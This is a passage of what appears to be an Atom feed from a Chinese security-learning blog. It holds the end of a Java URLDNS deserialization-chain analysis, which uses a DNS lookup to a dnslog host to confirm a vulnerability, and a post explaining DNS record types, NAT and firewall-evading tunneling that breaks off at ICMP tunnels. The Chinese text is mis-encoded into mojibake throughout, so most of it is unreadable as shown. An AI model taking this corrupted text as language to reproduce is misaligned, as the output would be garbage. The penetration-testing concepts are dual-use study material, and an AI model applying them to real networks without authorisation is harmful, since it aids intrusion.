¸å¿ƒåˆ©ç”¨ï¼‰</strong></h3><p><strong>URLçš„é™·é˜±é€»è¾‘</strong></p><p>URLçš„<code>hashCode</code>å‘ç°è‡ªå·±çš„<code>hashCode</code>æ˜¯-1ï¼ˆåå°„æ”¹å›çš„åˆå§‹å€¼ï¼‰ï¼Œäºæ˜¯è°ƒç”¨<code>URLStreamHandler.hashCode()</code></p><p>è¿™ä¸ªæ–¹æ³•å†…éƒ¨ä¼šè§£æURLçš„ä¸»æœºåï¼ˆå¦‚<code>xxx.dnslog.cn</code>ï¼‰ï¼Œè°ƒç”¨<code>InetAddress.getByName()</code>å‘èµ·DNSæŸ¥è¯¢</p><p><strong>ç»“æœåé¦ˆ</strong>ï¼šDNSæŸ¥è¯¢è®°å½•ä¼šè¢«æ”»å‡»è€…çš„ç›‘æ§å¹³å°ï¼ˆå¦‚DNSLogï¼‰æ•è·ï¼Œè¯æ˜ç›®æ ‡å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;URLDNS-é“¾å­åˆ†æ&quot;&gt;&lt;a href=&quot;#URLDNS-é“¾å­åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;URLDNS é“¾å­åˆ†æ&quot;&gt;&lt;/a&gt;URLDNS é“¾å­åˆ†æ&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘ç©¿é€åˆæ¢</title>
    <link href="https://gu0f3n.github.io/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/"/>
    <id>https://gu0f3n.github.io/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/</id>
    <published>2025-03-21T05:07:31.000Z</published>
    <updated>2025-03-21T12:27:21.468Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦ä¹ ä¸€ä¸‹ç½‘ç»œçŸ¥è¯†</p><p>ä¸»è¦å­¦ä¹ ä¸‹DNS,å› ä¸ºåœ¨åç»­çš„å†…ç½‘æ¸—é€ä¸åº”æ€¥æ„Ÿè§‰ç”¨çš„ä¼šæ¯”è¾ƒå¤š</p><p>DNSè§£ææµç¨‹æœ‰ä¸ªå¤§è‡´çš„äº†è§£ è¿™é‡Œå°±ä¸ä¸€ä¸€ç»†è°ˆäº†ä¸»è¦è¿˜æ˜¯å­¦ä¹ ä¸€ä¸‹åŸŸåè§£æè®°å½•</p><h2 id="åŸŸåè§£æè®°å½•"><a href="#åŸŸåè§£æè®°å½•" class="headerlink" title="åŸŸåè§£æè®°å½•"></a>åŸŸåè§£æè®°å½•</h2><h3 id="Aè®°å½•ï¼ˆå¿«é€’åœ°å€ç°¿ï¼‰"><a href="#Aè®°å½•ï¼ˆå¿«é€’åœ°å€ç°¿ï¼‰" class="headerlink" title="Aè®°å½•ï¼ˆå¿«é€’åœ°å€ç°¿ï¼‰****"></a><strong>Aè®°å½•</strong>ï¼ˆå¿«é€’åœ°å€ç°¿ï¼‰****</h3><p>ä»£è¡¨Addressï¼Œç”¨æ¥æŒ‡å®šåŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œå¦‚å°†item.taobao.comæŒ‡å®šåˆ°115.238.23.xxxï¼Œå°†switch.taobao.comæŒ‡å®šåˆ°121.14.24.xxxã€‚<strong>A****è®°å½•å¯ä»¥å°†å¤šä¸ªåŸŸåè§£æåˆ°ä¸€ä¸ªIPåœ°å€ï¼Œä½†æ˜¯ä¸èƒ½å°†ä¸€ä¸ªåŸŸåè§£æåˆ°å¤šä¸ªIPåœ°å€</strong></p><p><em>ä¾‹å­</em>ï¼š<code>item.taobao.com</code>æŒ‡å‘<code>115.238.23.xxx</code>ï¼Œç›¸å½“äºå‘Šè¯‰å¿«é€’å‘˜â€œæ·˜å®å•†å“é¡µçš„å¿«é€’é€åˆ°è¿™ä¸ªåœ°å€â€</p><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>ä¸€ä¸ªåŸŸååªèƒ½å¯¹åº”ä¸€ä¸ªIPï¼Œä½†å¤šä¸ªåŸŸåå¯ä»¥æŒ‡å‘åŒä¸€ä¸ªIPï¼ˆæ¯”å¦‚æ·˜å®çš„å¤šä¸ªå­é¡µé¢å…±ç”¨æœåŠ¡å™¨ï¼‰</li><li>å¦‚æœæœåŠ¡å™¨æ¬å®¶ï¼ˆæ¢IPï¼‰ï¼Œå¾—æ‰‹åŠ¨æ”¹åœ°å€ç°¿</li></ul><h3 id="MXè®°å½•ï¼ˆé‚®å±€åˆ†æ‹£å‘˜ï¼‰"><a href="#MXè®°å½•ï¼ˆé‚®å±€åˆ†æ‹£å‘˜ï¼‰" class="headerlink" title="MXè®°å½•ï¼ˆé‚®å±€åˆ†æ‹£å‘˜ï¼‰"></a><strong>MXè®°å½•ï¼ˆé‚®å±€åˆ†æ‹£å‘˜ï¼‰</strong></h3><p>Mail Exchangeï¼Œå°±æ˜¯å¯ä»¥å°†æŸä¸ªåŸŸåä¸‹çš„é‚®ä»¶æœåŠ¡å™¨æŒ‡å‘è‡ªå·±çš„Mail Serverï¼Œå¦‚taobao.comåŸŸåçš„Aè®°å½•IPåœ°å€æ˜¯115.238.25.xxxï¼Œå¦‚æœå°†MXè®°å½•è®¾ç½®ä¸º115.238.25.xxxï¼Œå³<a href="mailto:&#x78;&#x78;&#x78;&#x40;&#x74;&#x61;&#111;&#x62;&#97;&#x6f;&#x2e;&#99;&#111;&#109;">&#x78;&#x78;&#x78;&#x40;&#x74;&#x61;&#111;&#x62;&#97;&#x6f;&#x2e;&#99;&#111;&#109;</a>çš„é‚®ä»¶è·¯ç”±ï¼ŒDNSä¼šå°†é‚®ä»¶å‘é€åˆ°115.238.25.xxxæ‰€åœ¨çš„æœåŠ¡å™¨ï¼Œè€Œæ­£å¸¸é€šè¿‡Webè¯·æ±‚çš„è¯ä»ç„¶è§£æåˆ°Aè®°å½•çš„IPåœ°å€<br><strong>åŠŸèƒ½</strong>ï¼šä¸“é—¨ç®¡é‚®ä»¶çš„â€œå¿«é€’è·¯çº¿â€ã€‚å‘Šè¯‰åˆ«äººå‘åˆ°ä½ è¿™ä¸ªåŸŸåçš„é‚®ä»¶è¯¥é€åˆ°å“ªä¸ªé‚®å±€ï¼ˆé‚®ä»¶æœåŠ¡å™¨ï¼‰ã€‚<em>ä¾‹å­</em>ï¼š<code>xxx@taobao.com</code>çš„é‚®ä»¶ä¼šè¢«é€åˆ°<code>115.238.25.xxx</code>çš„æœåŠ¡å™¨ï¼Œè€Œç½‘é¡µè®¿é—®è¿˜æ˜¯èµ°Aè®°å½•çš„åœ°å€</p><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>å¯ä»¥è®¾å¤šä¸ªé‚®å±€ï¼Œä¼˜å…ˆçº§æ•°å­—å°çš„å…ˆé€ï¼ˆæ¯”å¦‚ä¼˜å…ˆçº§5çš„æœåŠ¡å™¨ä¼˜å…ˆäº10çš„ï¼‰</li><li>é‚®ä»¶æœåŠ¡å™¨åäº†ï¼Œå¤‡ç”¨çš„ä¼šè‡ªåŠ¨é¡¶ä¸Š</li></ul><h3 id="CNAMEè®°å½•ï¼ˆè¿é”åº—åˆ«åï¼‰"><a href="#CNAMEè®°å½•ï¼ˆè¿é”åº—åˆ«åï¼‰" class="headerlink" title="CNAMEè®°å½•ï¼ˆè¿é”åº—åˆ«åï¼‰"></a><strong>CNAMEè®°å½•ï¼ˆè¿é”åº—åˆ«åï¼‰</strong></h3><p>Canonical Nameï¼Œå³åˆ«åè§£æã€‚æ‰€è°“åˆ«åè§£æå°±æ˜¯å¯ä»¥ä¸ºä¸€ä¸ªåŸŸåè®¾ç½®ä¸€ä¸ªæˆ–è€…å¤šä¸ªåˆ«åï¼Œå¦‚å°†aaa.comè§£æåˆ°bbb.netã€å°†ccc.comä¹Ÿè§£æåˆ°bbb.netï¼Œå…¶ä¸­bbb.netåˆ†åˆ«æ˜¯aaa.comå’Œccc.comçš„åˆ«å</p><p><strong>åŠŸèƒ½</strong>ï¼šç»™åŸŸåèµ·å¤–å·ï¼Œå¤šä¸ªåå­—æŒ‡å‘åŒä¸€ä¸ªåœ°æ–¹</p><p><em>ä¾‹å­</em>ï¼š<code>aaa.com</code>å’Œ<code>ccc.com</code>éƒ½æŒ‡å‘<code>bbb.net</code>ï¼Œå°±åƒâ€œè‚¯å¾·åŸºâ€å’Œâ€œKFCâ€æ˜¯åŒä¸€å®¶åº—</p><p><strong>ç‰¹ç‚¹</strong></p><p>æ¢æœåŠ¡å™¨åœ°å€æ—¶ï¼Œåªç”¨æ”¹ä¸»åŸŸåï¼ˆæ¯”å¦‚<code>bbb.net</code>çš„IPï¼‰ï¼Œæ‰€æœ‰åˆ«åè‡ªåŠ¨æ›´æ–°ï¼Œä¸ç”¨ä¸€ä¸ªä¸ªæ”¹</p><p>å¿…é¡»å¸¦å‰ç¼€ï¼ˆæ¯”å¦‚<code>www.taobao.com</code>ä¸èƒ½ç›´æ¥å«<code>taobao.com</code>ï¼Œå¾—ç”¨Aè®°å½•</p><h3 id="NSè®°å½•ï¼ˆå¿«é€’å…¬å¸æ€»éƒ¨ï¼‰"><a href="#NSè®°å½•ï¼ˆå¿«é€’å…¬å¸æ€»éƒ¨ï¼‰" class="headerlink" title="NSè®°å½•ï¼ˆå¿«é€’å…¬å¸æ€»éƒ¨ï¼‰"></a><strong>NSè®°å½•ï¼ˆå¿«é€’å…¬å¸æ€»éƒ¨ï¼‰</strong></h3><p>ä¸ºæŸä¸ªåŸŸåæŒ‡å®šDNSè§£ææœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªåŸŸåç”±æŒ‡å®šçš„IPåœ°å€çš„DNSæœåŠ¡å™¨å–è§£æ</p><p><strong>åŠŸèƒ½</strong>ï¼šæŒ‡å®šè°è´Ÿè´£ä½ å®¶åŸŸåçš„â€œå¿«é€’åˆ†æ‹£â€ï¼ˆDNSè§£æï¼‰ã€‚<br><em>ä¾‹å­</em>ï¼šå¦‚æœä½ ç”¨è…¾è®¯äº‘çš„DNSæœåŠ¡ï¼ŒNSè®°å½•ä¼šå†™æˆ<code>ns1.dnspod.com</code>ï¼Œç›¸å½“äºæŠŠå¿«é€’åˆ†æ‹£å·¥ä½œå¤–åŒ…ç»™è…¾è®¯</p><p><strong>ç‰¹ç‚¹</strong></p><p>ä¸€ä¸ªåŸŸåå¯ä»¥æœ‰å¤šä¸ªåˆ†æ‹£ä¸­å¿ƒï¼ˆæ¯”å¦‚ä¸»å¤‡DNSæœåŠ¡å™¨ï¼‰</p><p>æ”¹NSè®°å½•åï¼Œå…¨çƒç”Ÿæ•ˆéœ€è¦24-48å°æ—¶ï¼ˆå› ä¸ºå„åœ°å¿«é€’å…¬å¸æ›´æ–°åœ°å€ç°¿è¦æ—¶é—´ï¼‰</p><h3 id="TXTè®°å½•ï¼ˆåº—é“ºç•™è¨€æ¿ï¼‰"><a href="#TXTè®°å½•ï¼ˆåº—é“ºç•™è¨€æ¿ï¼‰" class="headerlink" title="TXTè®°å½•ï¼ˆåº—é“ºç•™è¨€æ¿ï¼‰"></a><strong>TXTè®°å½•ï¼ˆåº—é“ºç•™è¨€æ¿ï¼‰</strong></h3><p>ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®è¯´æ˜ï¼Œå¦‚å¯ä»¥ä¸ºddd.netè®¾ç½®TXTè®°å½•ä¸ºâ€è¿™æ˜¯XXXçš„åšå®¢â€è¿™æ ·çš„è¯´æ˜</p><p><strong>åŠŸèƒ½</strong>ï¼šç»™åŸŸåè´´ä¸ªâ€œå¤‡æ³¨æ ‡ç­¾â€ï¼Œç”¨æ¥éªŒè¯èº«ä»½æˆ–é˜²åƒåœ¾é‚®ä»¶</p><p><em>ä¾‹å­</em>ï¼š</p><p>éªŒè¯åŸŸåæ‰€æœ‰æƒï¼šåŠ ä¸€æ¡TXTè®°å½•<code>google-site-verification=xxxxx</code>ï¼Œè¯æ˜ä½ æ˜¯ç½‘ç«™ä¸»äºº</p><p>é˜²åƒåœ¾é‚®ä»¶ï¼šè®¾ç½®SPFè®°å½•<code>v=spf1 include:aliyun.com ~all</code>ï¼Œå‘Šè¯‰åˆ«äººâ€œåªæœ‰é˜¿é‡Œäº‘çš„æœåŠ¡å™¨èƒ½ä»£è¡¨æˆ‘å‘é‚®ä»¶</p><p><strong>ç‰¹ç‚¹</strong></p><p>å†…å®¹éšä¾¿å†™ï¼Œä½†æ ¼å¼è¦å¯¹ï¼ˆæ¯”å¦‚SPFè®°å½•å¿…é¡»ä»¥<code>v=spf1</code>å¼€å¤´ï¼‰</p><p>ç®€å•å­¦ä¹ äº†è¿™ä¸ªåè®®çš„åŸºç¡€çŸ¥è¯†ä¹‹åå°±å‡†å¤‡å­¦ä¹ å†…ç½‘ç©¿é€çš„çŸ¥è¯†</p><h1 id="å†…ç½‘æ¸—é€ç³»åˆ—ï¼šå†…ç½‘ç©¿é€ï¼ˆéš§é“ï¼‰å­¦ä¹ "><a href="#å†…ç½‘æ¸—é€ç³»åˆ—ï¼šå†…ç½‘ç©¿é€ï¼ˆéš§é“ï¼‰å­¦ä¹ " class="headerlink" title="å†…ç½‘æ¸—é€ç³»åˆ—ï¼šå†…ç½‘ç©¿é€ï¼ˆéš§é“ï¼‰å­¦ä¹ "></a>å†…ç½‘æ¸—é€ç³»åˆ—ï¼šå†…ç½‘ç©¿é€ï¼ˆéš§é“ï¼‰å­¦ä¹ </h1><h2 id="å†…ç½‘ç©¿é€æ¦‚è¿°"><a href="#å†…ç½‘ç©¿é€æ¦‚è¿°" class="headerlink" title="å†…ç½‘ç©¿é€æ¦‚è¿°"></a>å†…ç½‘ç©¿é€æ¦‚è¿°</h2><h5 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h5><p>åˆ©ç”¨å„ç§éš§é“æŠ€æœ¯ï¼Œä»¥ç½‘ç»œé˜²ç«å¢™å…è®¸çš„åè®®ï¼Œç»•è¿‡ç½‘ç»œé˜²ç«å¢™çš„å°é”ï¼Œå®ç°è®¿é—®è¢«å°é”çš„ç›®æ ‡ç½‘ç»œ</p><p><em>å†…ç½‘ç©¿é€ï¼Œä¹Ÿå³ NAT ç©¿é€ï¼Œè¿›è¡Œ NAT ç©¿é€æ˜¯ä¸ºäº†ä½¿å…·æœ‰æŸä¸€ä¸ªç‰¹å®šæº IP åœ°å€å’Œæºç«¯å£å·çš„æ•°æ®åŒ…ä¸è¢« NAT è®¾å¤‡å±è”½è€Œæ­£ç¡®è·¯ç”±åˆ°å†…ç½‘ä¸»æœºã€‚</em></p><p>ç®€å•æ¥è¯´å†…ç½‘ç©¿é€çš„ç›®çš„æ˜¯ï¼šè®©å¤–ç½‘èƒ½è®¿é—®ä½ æœ¬åœ°çš„åº”ç”¨ï¼Œä¾‹å¦‚åœ¨å¤–ç½‘æ‰“å¼€ä½ æœ¬åœ°<a href="http://127.0.0.1æŒ‡å‘çš„webç«™ç‚¹.ä¸¾ä¾‹å­æˆ‘çš„ä¸–ç•Œä½ æƒ³è¦è¿›è¡Œå±€åŸŸç½‘è”æœºåŒæ—¶è¦å’Œä½ è¿œåœ¨å¤©è¾¹çš„æœ‹å‹è¿›è¡Œæ¸¸ç©é‚£ä¹ˆç›†å‹å°±å¯ä»¥åˆ©ç”¨å†…ç½‘ç©¿é€æ¥è¾¾æˆä¸ä½ ç©çš„ç›®çš„/">http://127.0.0.1æŒ‡å‘çš„Webç«™ç‚¹ã€‚ä¸¾ä¾‹å­æˆ‘çš„ä¸–ç•Œä½ æƒ³è¦è¿›è¡Œå±€åŸŸç½‘è”æœºåŒæ—¶è¦å’Œä½ è¿œåœ¨å¤©è¾¹çš„æœ‹å‹è¿›è¡Œæ¸¸ç©é‚£ä¹ˆç›†å‹å°±å¯ä»¥åˆ©ç”¨å†…ç½‘ç©¿é€æ¥è¾¾æˆä¸ä½ ç©çš„ç›®çš„</a></p><p>è¿™é‡Œç®€å•äº†è§£ä¸‹NATåè®®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**NAT åè®®ï¼ˆNetwork Address Translationï¼‰** çš„åº”ç”¨åœºæ™¯å¦‚åŒå®ƒçš„åç§°â€”â€”ç½‘ç»œåœ°å€è½¬æ¢ï¼Œåº”ç”¨äºå†…éƒ¨ç½‘åˆ°å¤–éƒ¨ç½‘çš„åœ°å€è½¬æ¢è¿‡ç¨‹ä¸­ã€‚</span><br><span class="line"></span><br><span class="line">**æ ¸å¿ƒåŠŸèƒ½**ï¼šæŠŠå†…ç½‘è®¾å¤‡çš„â€œç§æœ‰é—¨ç‰Œå·â€ï¼ˆç§æœ‰IPï¼‰è½¬æ¢æˆå¤–ç½‘çš„â€œå…¬å…±é—¨ç‰Œå·â€ï¼ˆå…¬ç½‘IPï¼‰ï¼Œæ–¹ä¾¿å†…å¤–ç½‘é€šä¿¡</span><br><span class="line"></span><br><span class="line">*ä¾‹å­*ï¼šä½ å®¶åœ¨å°åŒº3å·æ¥¼ï¼ˆå†…ç½‘IP `192.168.1.5`ï¼‰ï¼Œä½†å¿«é€’å•ä¸Šåªèƒ½å†™å°åŒºå¤§é—¨åœ°å€ï¼ˆå…¬ç½‘IP `219.155.6.240`ï¼‰ï¼Œé—¨å«ï¼ˆNATè®¾å¤‡ï¼‰è´Ÿè´£æŠŠå¿«é€’é€åˆ°ä½ å®¶</span><br><span class="line"></span><br><span class="line">**ä¸ºä»€ä¹ˆéœ€è¦NATï¼Ÿ****</span><br><span class="line"></span><br><span class="line">**æ ¹æœ¬åŸå› **ï¼šå…¨çƒå…¬ç½‘IPä¸å¤Ÿç”¨ï¼ˆç±»ä¼¼é—¨ç‰Œå·ä¸å¤Ÿï¼‰ï¼Œè€Œå°åŒºï¼ˆå†…ç½‘ï¼‰å¯ä»¥æ— é™å¤åˆ¶ç§æœ‰é—¨ç‰Œå·</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæƒ³è¦å®ç°å†…ç½‘ç©¿é€å°±å¾—è¿›è¡Œä¸€ä¸ªæ­å»ºæ¡¥æ¢</p><h3 id="å¸¸è§å®ç°æ–¹å¼ï¼ˆæ€ä¹ˆæ­æ¡¥ï¼Ÿï¼‰"><a href="#å¸¸è§å®ç°æ–¹å¼ï¼ˆæ€ä¹ˆæ­æ¡¥ï¼Ÿï¼‰" class="headerlink" title="å¸¸è§å®ç°æ–¹å¼ï¼ˆæ€ä¹ˆæ­æ¡¥ï¼Ÿï¼‰****"></a><strong>å¸¸è§å®ç°æ–¹å¼</strong>ï¼ˆæ€ä¹ˆæ­æ¡¥ï¼Ÿï¼‰****</h3><p>ç«¯å£æ˜ å°„ åå‘ä»£ç†ï¼Œvpnéš§é“ï¼ŒNATè¿›è¡Œç©¿é€</p><p>ç«¯å£æ˜ å°„å°±æ˜¯æŠŠå†…ç½‘çš„ipéƒ½æ˜ å°„åˆ°ä¸€ä¸ªå…¬ç½‘çš„ç«¯å£ä¸Šé¢æ‰€æœ‰çš„æµé‡å°±ä¼šä»å…¬ç½‘ipç«¯å£è¿›å…¥åˆ°ä½ çš„å†…ç½‘ip</p><p>åå‘ä»£ç† å°±æ¯”å¦‚è¯´æˆ‘ä»¬ç§Ÿä¸€ä¸ªäº‘æœåŠ¡å™¨ï¼Œåˆ«äººå¯¹äº‘æœåŠ¡çš„å…¬ç½‘ipè¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨ä¼šæŠŠåˆ«äººè®¿é—®çš„æµé‡è½¬æ¥åˆ°æˆ‘ä»¬å†…ç½‘çš„è®¾å¤‡</p><p><strong>ä¾‹å­</strong>ï¼šç”¨frpå·¥å…·æŠŠå†…ç½‘æ‘„åƒå¤´ç”»é¢é€šè¿‡äº‘æœåŠ¡å™¨æš´éœ²ç»™å¤–ç½‘</p><p>vpnå°±æ˜¯å¼€ä¸€æ¡æ–°çš„éš§é“ ç›´æ¥åˆ°å…¬ç½‘ä¸ä¼šç»è¿‡è¿è¥å•†</p><p>å†…ç½‘ç©¿é€ï¼ˆNATç©¿é€ï¼‰è’‹NATè®¾å¤‡è®°å½•ç”¨æ¥æŠŠå†…éƒ¨ç½‘ç»œçš„ç§æœ‰IPåœ°å€æ˜ å°„åˆ°å¤–éƒ¨ç½‘ç»œçš„åˆæ³•IPåœ°å€ä¸Šå»</p><p>ææ¸…æ¥šå†…ç½‘ç©¿é€çš„åŸºæœ¬åŸç†</p><p>ç»ˆäºåˆ°éš§é“æŠ€æœ¯äº†</p><h1 id="éš§é“æŠ€æœ¯"><a href="#éš§é“æŠ€æœ¯" class="headerlink" title="éš§é“æŠ€æœ¯"></a><strong>éš§é“æŠ€æœ¯</strong></h1><p>ä¸€ç§é€šè¿‡ä½¿ç”¨äº’è”ç½‘ç»œçš„åŸºç¡€è®¾æ–½åœ¨ç½‘ç»œä¹‹é—´ä¼ é€’æ•°æ®çš„æ–¹å¼ï¼ŒåŒ…æ‹¬æ•°æ®å°è£…ã€ä¼ è¾“å’Œè§£åŒ…åœ¨å†…çš„å…¨è¿‡ç¨‹ã€‚ä½¿ç”¨éš§é“ä¼ é€’çš„æ•°æ®(æˆ–è´Ÿè½½)å¯ä»¥æ˜¯ä¸åŒåè®®çš„æ•°æ®å¸§æˆ–åŒ…ã€‚</p><p>ç”¨å¤§ç™½è¯è§£é‡Š<strong>éš§é“æŠ€æœ¯</strong>ï¼Œå¯ä»¥æƒ³è±¡æˆ<strong>ç»™æ•°æ®åŒ…ç©¿é©¬ç”²è¿‡å®‰æ£€</strong>çš„è¿‡ç¨‹</p><p>æ•´ä¸ªè¿‡ç¨‹å°±åƒå¿«é€’å‘˜è¦æŠŠè¿ç¦å“é€è¿‡å®‰æ£€ï¼Œå¿…é¡»å¥—ä¸ªåˆæ³•çš„åŒ…è£…ï¼Œè¿‡äº†æ£€æŸ¥å†æ‹†å¼€è¿˜åŸã€‚å…·ä½“åˆ†ä¸‰æ­¥èµ°</p><h3 id="ç¬¬ä¸€æ­¥ï¼šç©¿é©¬ç”²ï¼ˆå°è£…ï¼‰"><a href="#ç¬¬ä¸€æ­¥ï¼šç©¿é©¬ç”²ï¼ˆå°è£…ï¼‰" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šç©¿é©¬ç”²ï¼ˆå°è£…ï¼‰"></a><strong>ç¬¬ä¸€æ­¥ï¼šç©¿é©¬ç”²ï¼ˆå°è£…ï¼‰</strong></h3><p><strong>ä¼ªè£…éœ€æ±‚</strong>ï¼šæ¯”å¦‚ä½ æƒ³ä»å…¬å¸å†…ç½‘ä¼ æ–‡ä»¶åˆ°å®¶é‡Œï¼Œä½†å…¬å¸é˜²ç«å¢™åªå…è®¸HTTPæµé‡é€šè¿‡ï¼ˆå…¶ä»–åè®®å…¨è¢«æ‹¦æˆªï¼‰</p><p><strong>å¥—å¤–å£³</strong>ï¼šéš§é“æŠ€æœ¯ä¼šæŠŠä½ çš„æ–‡ä»¶æ•°æ®ï¼ˆæ¯”å¦‚SSHåè®®ï¼‰å¡è¿›HTTPåè®®çš„â€œå¿«é€’ç®±â€é‡Œï¼Œå¹¶è´´ä¸Šæ–°æ ‡ç­¾ï¼ˆå¦‚ç›®æ ‡åœ°å€ã€ç«¯å£ï¼‰</p><p><em>å°±åƒæŠŠç§å¯†ä¿¡ä»¶å¡è¿›æœˆé¥¼ç›’ï¼Œå¤–é¢å†™ä¸Šâ€œèŠ‚æ—¥ç¤¼å“â€è’™æ··è¿‡å…³ã€‚</em></p><h3 id="ç¬¬äºŒæ­¥ï¼šè¿‡å®‰æ£€ï¼ˆä¼ è¾“ï¼‰"><a href="#ç¬¬äºŒæ­¥ï¼šè¿‡å®‰æ£€ï¼ˆä¼ è¾“ï¼‰" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šè¿‡å®‰æ£€ï¼ˆä¼ è¾“ï¼‰"></a><strong>ç¬¬äºŒæ­¥ï¼šè¿‡å®‰æ£€ï¼ˆä¼ è¾“ï¼‰</strong></h3><p><strong>èµ°å…¬å…±é€šé“</strong>ï¼šä¼ªè£…åçš„æ•°æ®åŒ…é€šè¿‡å…¬å…±ç½‘ç»œï¼ˆæ¯”å¦‚äº’è”ç½‘ï¼‰ä¼ è¾“ï¼Œé˜²ç«å¢™çœ‹åˆ°çš„æ˜¯åˆæ³•çš„HTTPæµé‡ï¼Œç›´æ¥æ”¾è¡Œ<em>æ¯”å¦‚ç”¨å¾®ä¿¡å‘æ–‡ä»¶ï¼Œå®é™…èµ°çš„æ˜¯å¾®ä¿¡çš„æœåŠ¡å™¨é€šé“ï¼Œè€Œä¸æ˜¯ç›´è¿å¯¹æ–¹ç”µè„‘ã€‚</em></p><p><strong>è·¯ç”±ä¸­è½¬</strong>ï¼šæ•°æ®åŒ…å¯èƒ½ç»è¿‡å¤šä¸ªè·¯ç”±å™¨è·³è½¬ï¼Œä½†å…¨ç¨‹ä¿æŒâ€œé©¬ç”²â€ä¸è„±è½<em>ç±»ä¼¼å¿«é€’ä»åŒ—äº¬å‘å¹¿å·ï¼Œä¸­é—´ç»è¿‡éƒ‘å·ã€é•¿æ²™ä¸­è½¬ç«™ï¼Œä½†æœˆé¥¼ç›’å§‹ç»ˆå®Œå¥½</em></p><h3 id="ç¬¬ä¸‰æ­¥ï¼šæ‹†åŒ…è£¹ï¼ˆè§£åŒ…ï¼‰"><a href="#ç¬¬ä¸‰æ­¥ï¼šæ‹†åŒ…è£¹ï¼ˆè§£åŒ…ï¼‰" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šæ‹†åŒ…è£¹ï¼ˆè§£åŒ…ï¼‰"></a><strong>ç¬¬ä¸‰æ­¥ï¼šæ‹†åŒ…è£¹ï¼ˆè§£åŒ…ï¼‰</strong></h3><p><strong>ç›®çš„åœ°éªŒæ”¶</strong>ï¼šæ•°æ®åŒ…åˆ°è¾¾ç›®æ ‡æœåŠ¡å™¨åï¼Œéš§é“ç«¯ç‚¹ï¼ˆå¦‚å®¶é‡Œçš„VPNæœåŠ¡å™¨ï¼‰ä¼šæ‹†æ‰HTTPçš„â€œé©¬ç”²â€ï¼Œè¿˜åŸå‡ºåŸå§‹æ•°æ®ï¼ˆSSHåè®®æ–‡ä»¶ï¼‰</p><p><em>å°±åƒæ”¶åˆ°æœˆé¥¼ç›’åæ‹†å¼€ï¼Œå–å‡ºé‡Œé¢çš„ç§å¯†ä¿¡ä»¶</em><strong>ç²¾å‡†æŠ•é€’</strong>ï¼šè§£åŒ…åçš„æ•°æ®æŒ‰åŸå§‹åè®®é€åˆ°æœ€ç»ˆè®¾å¤‡ï¼ˆå¦‚ä½ çš„å®¶ç”¨ç”µè„‘ï¼‰</p><p>æŒ‰æ‰€å¤„çš„åè®®å±‚åˆ†å±‚ï¼š</p><ul><li>ç½‘ç»œå±‚éš§é“ï¼šICMPéš§é“ç­‰</li><li>ä¼ è¾“å±‚éš§é“ï¼šTCPéš§é“ã€UDPéš§é“</li><li>åº”ç”¨å±‚éš§é“ï¼šHTTPã€DNSã€SSHç­‰éš§é“</li></ul><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250321142723.png"></p><p>é‚£ä¹ˆå†…ç½‘é‡Œé¢é™¤äº†åˆšæ‰äº†è§£åˆ°çš„httpåè®®å¯ä»¥é€šè¿‡é˜²ç«å¢™è¿›è¡Œå‡ºç½‘è¿˜æœ‰å“ªäº›åè®®å‘¢</p><h3 id="å†…ç½‘ä¸»æœºæ‰€æœ‰å¯èƒ½çš„å‡ºç½‘æ–¹å¼"><a href="#å†…ç½‘ä¸»æœºæ‰€æœ‰å¯èƒ½çš„å‡ºç½‘æ–¹å¼" class="headerlink" title="å†…ç½‘ä¸»æœºæ‰€æœ‰å¯èƒ½çš„å‡ºç½‘æ–¹å¼"></a>å†…ç½‘ä¸»æœºæ‰€æœ‰å¯èƒ½çš„å‡ºç½‘æ–¹å¼</h3><h5 id="å…è®¸ICMPåè®®å‡ºç½‘"><a href="#å…è®¸ICMPåè®®å‡ºç½‘" class="headerlink" title="å…è®¸ICMPåè®®å‡ºç½‘"></a>å…è®¸ICMPåè®®å‡ºç½‘</h5><h2 id="ICMPéš§é“åŸç†"><a href="#ICMPéš§é“åŸç†" class="headerlink" title="ICMPéš§é“åŸç†"></a>ICMPéš§é“åŸç†</h2><p>é¦–å…ˆäº†è§£ä¸‹ICMPè¿™ä¸ªåè®®</p><p>ICMPï¼ˆInternet Control Message Protocolï¼‰Internetæ§åˆ¶æŠ¥æ–‡åè®®ã€‚å®ƒæ˜¯TCP&#x2F;IPåè®®ç°‡çš„ä¸€ä¸ªå­åè®®ï¼Œç”¨äºåœ¨IPä¸»æœºã€è·¯ç”±å™¨ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ã€‚æ§åˆ¶æ¶ˆæ¯æ˜¯æŒ‡ç½‘ç»œé€šä¸é€šã€ä¸»æœºæ˜¯å¦å¯è¾¾ã€è·¯ç”±æ˜¯å¦å¯ç”¨ç­‰ç½‘ç»œæœ¬èº«çš„æ¶ˆæ¯ã€‚è¿™äº›æ§åˆ¶æ¶ˆæ¯è™½ç„¶å¹¶ä¸ä¼ è¾“ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯å¯¹äºç”¨æˆ·æ•°æ®çš„ä¼ 